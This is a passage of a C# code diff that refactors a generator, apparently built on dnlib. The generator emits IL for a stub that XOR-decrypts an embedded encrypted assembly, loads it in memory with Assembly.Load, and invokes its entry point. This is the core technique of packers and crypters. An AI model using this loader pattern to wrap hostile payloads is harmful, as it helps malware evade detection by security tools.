-        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5])); // i
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction()); // enc
-        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5])); // i
-        body.Instructions.Add(OpCodes.Ldelem_U1.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_3.ToInstruction()); // keyArr
-        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5])); // i
-        body.Instructions.Add(OpCodes.Ldloc_3.ToInstruction()); // keyArr
-        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
-        body.Instructions.Add(OpCodes.Rem.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldelem_U1.ToInstruction());
-        body.Instructions.Add(OpCodes.Xor.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_U1.ToInstruction());
-        body.Instructions.Add(OpCodes.Stelem_I1.ToInstruction());
+        var loopBody = OpCodes.Ldloc_3.ToInstruction(); // plain
+        I.Add(loopBody);
+        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6])); // i
+        I.Add(OpCodes.Ldloc_1.ToInstruction()); // enc
+        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6])); // i
+        I.Add(OpCodes.Ldelem_U1.ToInstruction());
+        I.Add(OpCodes.Ldloc_2.ToInstruction()); // key
+        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6])); // i
+        I.Add(OpCodes.Ldloc_2.ToInstruction()); // key
+        I.Add(OpCodes.Ldlen.ToInstruction());
+        I.Add(OpCodes.Conv_I4.ToInstruction());
+        I.Add(OpCodes.Rem.ToInstruction());
+        I.Add(OpCodes.Ldelem_U1.ToInstruction());
+        I.Add(OpCodes.Xor.ToInstruction());
+        I.Add(OpCodes.Conv_U1.ToInstruction());
+        I.Add(OpCodes.Stelem_I1.ToInstruction());
+        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6]));
+        I.Add(OpCodes.Ldc_I4_1.ToInstruction());
+        I.Add(OpCodes.Add.ToInstruction());
+        I.Add(OpCodes.Stloc.ToInstruction(body.Variables[6]));
 
-        // i++
-        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5]));
-        body.Instructions.Add(OpCodes.Ldc_I4_1.ToInstruction());
-        body.Instructions.Add(OpCodes.Add.ToInstruction());
-        body.Instructions.Add(OpCodes.Stloc.ToInstruction(body.Variables[5]));
+        I.Add(loopCheck);
+        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6]));
+        I.Add(OpCodes.Ldloc_1.ToInstruction());
+        I.Add(OpCodes.Ldlen.ToInstruction());
+        I.Add(OpCodes.Conv_I4.ToInstruction());
+        I.Add(OpCodes.Blt.ToInstruction(loopBody));
 
-        // i < enc.Length
-        body.Instructions.Add(loopCheck);
-        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5]));
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
-        body.Instructions.Add(OpCodes.Blt.ToInstruction(loopBody));
+        // var loaded = Assembly.Load(plain); var ep = loaded.EntryPoint;
+        I.Add(OpCodes.Ldloc_3.ToInstruction());
+        I.Add(OpCodes.Call.ToInstruction(asmLoad));
+        I.Add(OpCodes.Callvirt.ToInstruction(getEntryPt));
+        I.Add(OpCodes.Stloc.ToInstruction(body.Variables[4]));
 
-        // var loaded = Assembly.Load(plain);
-        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[4]));
-        body.Instructions.Add(OpCodes.Call.ToInstruction(assemblyLoad));
-        body.Instructions.Add(OpCodes.Stloc.ToInstruction(body.Variables[6]));
-
-        // var ep = loaded.EntryPoint;
-        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6]));
-        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getEntryPoint));
-
-        // Check if entry point has parameters
-        body.Instructions.Add(OpCodes.Dup.ToInstruction());
-        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getParameters));
-        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
+        // Build invokeArgs: check if ep has parameters
+        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[4]));
+        I.Add(OpCodes.Callvirt.ToInstruction(getParams));
+        I.Add(OpCodes.Ldlen.ToInstruction());
 
         var hasArgs = OpCodes.Nop.ToInstruction();
-        var doInvoke = OpCodes.Nop.ToInstruction();
-        body.Instructions.Add(OpCodes.Brtrue.ToInstruction(hasArgs));
+        I.Add(OpCodes.Brtrue.ToInstruction(hasArgs));
 
-        // No params: ep.Invoke(null, null)
-        body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
-        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(methodInvoke));
-        body.Instructions.Add(OpCodes.Pop.ToInstruction());
-        body.Instructions.Add(OpCodes.Br.ToInstruction(doInvoke));
+        // No params path: empty object[]
+        I.Add(OpCodes.Ldc_I4_0.ToInstruction());
+        I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Object.TypeDefOrRef));
+        var storeArgs = OpCodes.Stloc.ToInstruction(body.Variables[5]);
+        I.Add(OpCodes.Br.ToInstruction(storeArgs));
 
-        // Has params: ep.Invoke(null, new object[] { args })
-        body.Instructions.Add(hasArgs);
-
-        // Check if original entry point has args parameter
-        bool originalHasArgs = entryPoint.Parameters.Count > 0;
-        if (originalHasArgs)
-        {
-            body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
-            body.Instructions.Add(OpCodes.Ldc_I4_1.ToInstruction());
-            body.Instructions.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Object.TypeDefOrRef));
-            body.Instructions.Add(OpCodes.Dup.ToInstruction());
-            body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
-            body.Instructions.Add(OpCodes.Ldarg_0.ToInstruction()); // args from Main(string[] args)
-            body.Instructions.Add(OpCodes.Stelem_Ref.ToInstruction());
-            body.Instructions.Add(OpCodes.Callvirt.ToInstruction(methodInvoke));
-            body.Instructions.Add(OpCodes.Pop.ToInstruction());
-        }
+        // Has params path: new object[] { args }
+        I.Add(hasArgs);
+        I.Add(OpCodes.Ldc_I4_1.ToInstruction());
+        I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Object.TypeDefOrRef));
+        I.Add(OpCodes.Dup.ToInstruction());
+        I.Add(OpCodes.Ldc_I4_0.ToInstruction());
+        // Load the original args parameter
+        if (entryPoint.Parameters.Count > 0)
+            I.Add(new Instruction(OpCodes.Ldarg, entryPoint.Parameters[0]));
         else
         {
-            body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
-            body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
-            body.Instructions.Add(OpCodes.Callvirt.ToInstruction(methodInvoke));
-            body.Instructions.Add(OpCodes.Pop.ToInstruction());
+            I.Add(OpCodes.Ldc_I4_0.ToInstruction());
+            I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.String.TypeDefOrRef));
         }
+        I.Add(OpCodes.Stelem_Ref.ToInstruction());
 
-        body.Instructions.Add(doInvoke);
-        body.Instructions.Add(OpCodes.Ret.ToInstruction());
+        I.Add(storeArgs);
+
+        // ep.Invoke(null, invokeArgs)
+        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[4]));
+        I.Add(OpCodes.Ldnull.ToInstruction());
+        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5]));
+        I.Add(OpCodes.Callvirt.ToInstruction(invoke));
+        I.Add(OpCodes.Pop.ToInstruction());
+        I.Add(OpCodes.Ret.ToInstruction());
 
         body.SimplifyBranches();
         body.OptimizeBranches();
